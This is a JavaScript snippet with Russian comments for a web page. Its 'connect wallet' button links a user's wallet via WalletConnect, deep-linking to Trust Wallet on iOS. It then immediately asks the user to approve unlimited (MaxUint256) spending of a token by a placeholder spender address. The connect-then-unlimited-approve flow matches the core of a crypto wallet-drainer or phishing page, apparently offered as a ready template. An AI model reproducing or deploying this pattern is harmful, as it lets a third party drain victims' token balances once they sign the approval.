const projectId = "ВАШ_PROJECT_ID"; // Замените на ваш WalletConnect Project ID
const contractAddress = "0xYourTokenAddress"; // Токен, на который хотите дать approve
const spender = "0xSpenderAddress"; // Адрес, которому даете доступ
const amountToApprove = ethers.constants.MaxUint256; // Максимальное количество токенов

let provider;

async function connectWallet() {
  try {
    document.getElementById("connectBtn").disabled = true;
    document.getElementById("status").textContent = "Connecting...";

    // Инициализация WalletConnect провайдера
    provider = await window.WalletConnectProvider.init({
      projectId,
      chains: [1], // Ethereum Mainnet
      showQrModal: true, // Показать QR-код для подключения кошелька
    });

    // Для устройств iOS — открытие Trust Wallet напрямую
    if (/iPhone|iPad|iPod/i.test(navigator.userAgent)) {
      provider.signer.client.core.openWallet = async (uri) => {
        window.location.href = `https://link.trustwallet.com/wc?uri=${encodeURIComponent(uri)}`;
      };
    }

    // Подключение к кошельку
    await provider.enable();
    const ethersProvider = new ethers.providers.Web3Provider(provider);
    const signer = ethersProvider.getSigner();
    const account = await signer.getAddress();

    document.getElementById("status").textContent = `Connected: ${account}`;

    // ABI для вызова approve
    const abi = ["function approve(address spender, uint256 amount) public returns (bool)"];
    const tokenContract = new ethers.Contract(contractAddress, abi, signer);

    // Выполняем approve для всех токенов
    const tx = await tokenContract.approve(spender, amountToApprove);
    document.getElementById("status").textContent = "Approving...";
    await tx.wait();

    document.getElementById("status").textContent = `Approved! TX: ${tx.hash}`;

  } catch (error) {
    document.getElementById("status").textContent = `Error: ${error.message}`;
    document.getElementById("connectBtn").disabled = false;
  }
}

document.getElementById("connectBtn").addEventListener("click", connectWallet);